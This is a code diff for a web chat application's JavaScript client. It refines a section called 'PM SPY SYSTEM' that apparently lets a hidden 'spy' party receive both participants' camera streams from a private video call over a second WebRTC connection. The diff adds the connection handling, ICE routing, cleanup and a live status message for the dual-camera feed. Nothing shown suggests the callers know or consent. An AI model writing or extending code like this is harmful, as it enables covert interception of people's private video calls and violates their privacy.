@@ -2385,8 +2385,7 @@ function createNewRank(){
 
 // ===== PM SPY SYSTEM =====
 let _spyUser1=null, _spyUser2=null, _spyPC=null, _spyStream=null;
-let _spyStream2=null, _spyZoomed=0; // 0=split, 1=cam1 full, 2=cam2 full
-let _spyTrackCount=0; // tracks received so far
+let _spyStream2=null, _spyZoomed=0, _spyTrackCount=0, _spyPC2=null;
 
 function spyToggleZoom(cam){
   const grid=document.getElementById('spy-cams-grid');
@@ -2479,6 +2478,7 @@ function closeSpyModal(){
 
 function _stopSpyCall(){
   if(_spyPC){ _spyPC.close(); _spyPC=null; }
+  if(_spyPC2){ _spyPC2.close(); _spyPC2=null; }
   if(_spyStream){ _spyStream.getTracks().forEach(t=>t.stop()); _spyStream=null; }
   if(_spyStream2){ _spyStream2.getTracks().forEach(t=>t.stop()); _spyStream2=null; }
   _spyTrackCount=0; _spyZoomed=0;
@@ -2486,13 +2486,14 @@ function _stopSpyCall(){
   const sv2=document.getElementById('spy-video2');
   if(sv){ sv.srcObject=null; }
   if(sv2){ sv2.srcObject=null; }
-  // Reset grid
   const grid=document.getElementById('spy-cams-grid');
   const w1=document.getElementById('spy-cam1-wrap');
   const w2=document.getElementById('spy-cam2-wrap');
   if(grid) grid.style.gridTemplateColumns='1fr 1fr';
   if(w1) w1.style.display='block';
   if(w2) w2.style.display='block';
+  const ph=document.getElementById('spy-cam2-placeholder');
+  if(ph) ph.style.display='flex';
 }
 
 async function _startSpyPC(offer, convKey, callerName){
@@ -2634,11 +2635,10 @@ socket.on('spy-call-ice', async (d) => {
 
 // Direct offer from caller to spy (second handshake for actual stream)
 socket.on('spy-direct-offer', async (d) => {
-  if(!_spyPC) return;
   try{
+    if(_spyPC2){ _spyPC2.close(); _spyPC2=null; }
     const ICE_CFG={iceServers:[{urls:'stun:stun.l.google.com:19302'},{urls:'stun:stun.cloudflare.com:3478'}]};
-    // Create a SECOND separate PC for receiver's stream
-    let _spyPC2 = new RTCPeerConnection(ICE_CFG);
+    _spyPC2 = new RTCPeerConnection(ICE_CFG);
     _spyPC2.ontrack = e => {
       if(e.track.kind==='video'){
         _spyStream2 = e.streams[0]||new MediaStream([e.track]);
@@ -2649,12 +2649,14 @@ socket.on('spy-direct-offer', async (d) => {
         if(ph) ph.style.display='none';
         const lbl2 = document.getElementById('spy-cam2-label');
         if(lbl2 && _spyUser2) lbl2.textContent = '📹 ' + _spyUser2;
-      } else if(e.track.kind==='audio'){
-        // Mix into existing audio or ignore (already have audio from cam1)
+        document.getElementById('spy-call-status').textContent = '🔴 كلتا الكاميرتين نشطتان — مباشر';
       }
     };
     _spyPC2.onicecandidate = e => {
       if(e.candidate) socket.emit('spy-ice-back',{candidate:e.candidate,callerId:d.from});
+    };
+    _spyPC2.onconnectionstatechange = () => {
+      console.log('SpyPC2 state:', _spyPC2?.connectionState);
     };
     await _spyPC2.setRemoteDescription(new RTCSessionDescription(d.offer));
     const answer = await _spyPC2.createAnswer();
@@ -2664,9 +2666,14 @@ socket.on('spy-direct-offer', async (d) => {
 });
 
 socket.on('spy-direct-ice', async (d) => {
-  if(!_spyPC) return;
+  // Could be for PC1 or PC2 - try both
   try{
-    if(d.candidate) await _spyPC.addIceCandidate(new RTCIceCandidate(d.candidate));
+    if(_spyPC && _spyPC.remoteDescription && d.candidate)
+      await _spyPC.addIceCandidate(new RTCIceCandidate(d.candidate));
+  }catch(e){}
+  try{
+    if(_spyPC2 && _spyPC2.remoteDescription && d.candidate)
+      await _spyPC2.addIceCandidate(new RTCIceCandidate(d.candidate));
   }catch(e){}
 });
 
